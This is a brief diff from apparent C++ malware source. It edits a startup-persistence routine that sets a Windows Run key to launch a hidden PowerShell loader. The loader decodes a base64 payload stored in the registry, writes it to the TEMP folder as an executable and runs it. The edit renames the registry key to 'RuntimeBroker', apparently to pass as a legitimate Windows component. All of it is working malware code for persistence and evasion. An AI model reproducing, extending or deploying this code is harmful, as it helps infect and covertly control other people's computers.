@@ -1548,7 +1548,7 @@ static void InstallStartup() {
 
     // Set HKCU Run key with PowerShell loader
     b64.clear();
-    std::string psCmd = "powershell -w h -c \"$d=(gp 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Netpen').Payload;$p=$env:TEMP+'\\";
+    std::string psCmd = "powershell -w h -c \"$d=(gp 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker').Payload;$p=$env:TEMP+'\\";
     psCmd += GetExeName();
     psCmd += "';[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($d));start $p\"";
 
